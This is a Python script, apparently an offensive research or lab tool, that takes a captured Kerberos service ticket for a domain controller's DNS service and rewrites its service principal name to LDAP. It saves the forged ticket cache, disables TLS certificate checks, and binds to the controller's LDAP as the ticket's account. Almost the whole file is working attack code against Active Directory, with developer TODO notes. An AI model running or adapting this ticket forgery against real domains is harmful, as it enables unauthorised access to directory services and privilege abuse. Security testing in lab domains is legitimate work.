from gssapi import creds

import gssapi.raw as gr
from impacket.krb5 import ccache, types
import json
import os


# This code seems to have what we want:
# https://github.com/pythongssapi/python-gssapi/blob/6e0b6b16825199aca531779c11de777c9c695c03/gssapi/tests/test_raw.py#L451C1-L452C1
CCACHE = 'FILE:/home/kali/Tools/dapper/vagrant-tgs-3.2.24'
store = {b'ccache': CCACHE.encode('UTF-8')}
cred = gr.acquire_cred_from(store).creds

# Currently a bit of a hack, overwrites the krb5ccname env var
# TODO: Figure out alternative way to reference ours (controls param for ldap?) 
#   ^ shouuld work in theory, but it's like we're looking at the wrong method definition,
#   the expected # & type of control params don't match
# If no match on this tgs' spn, but it's the same service account, then create
# backup and fudge spn
cacheFileName = "/home/kali/Tools/dapper/vagrant-dns-tgs-3.2.24.ccache"
forgedCacheName = "/home/kali/Tools/dapper/vagrant-dns-tgs-3.2.24-backup.ccache"
cache = ccache.CCache.loadFile(cacheFileName)
cache.prettyPrint()

print("\n\n\n\n\n^ is cache, below is cred\n\n\n\n\n")
# impcred = cache.getCredential("DNS/dc.windomain.local@") # Needs this format
# impcred.prettyPrint()

for impcred in cache.credentials:
    newSPN = "ldap/dc.windomain.local@WINDOMAIN.LOCAL"
    np = types.Principal(newSPN, type=impcred.header["server"].header['name_type'])
    newprincipal = ccache.Principal()
    newprincipal.fromPrincipal(np)
    impcred.header["server"] = newprincipal

cache.prettyPrint()
cache.saveFile(forgedCacheName)

os.environ["KRB5CCNAME"] = forgedCacheName

from ldap3 import Server, Connection, Tls, SASL, KERBEROS
import ssl
tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
server = Server('ldap://dc.windomain.local', use_ssl=True, tls=tls)
# TODO: Prefix w/ ldaps or ldap? 
# Prefix seems necessary here
# TODO: Specify user? Do we need TGS for particular host w/ particular service type?
c = Connection(
    server, authentication=SASL, sasl_mechanism=KERBEROS)

# control = ("dc.windomain.local",  # Noen/false to use server hostname, true to rev lookup server ip, or choose a hostname
#                 False,  # 
#                 None)
# controls = [control]

# https://github.com/cannatag/ldap3/blob/8077d25461bb00ee28232a777f3ecb716b4bb985/ldap3/protocol/sasl/kerberos.py#L88
c.bind(read_server_info=True) # raw gssapi credential object
print(c.extend.standard.who_am_i())
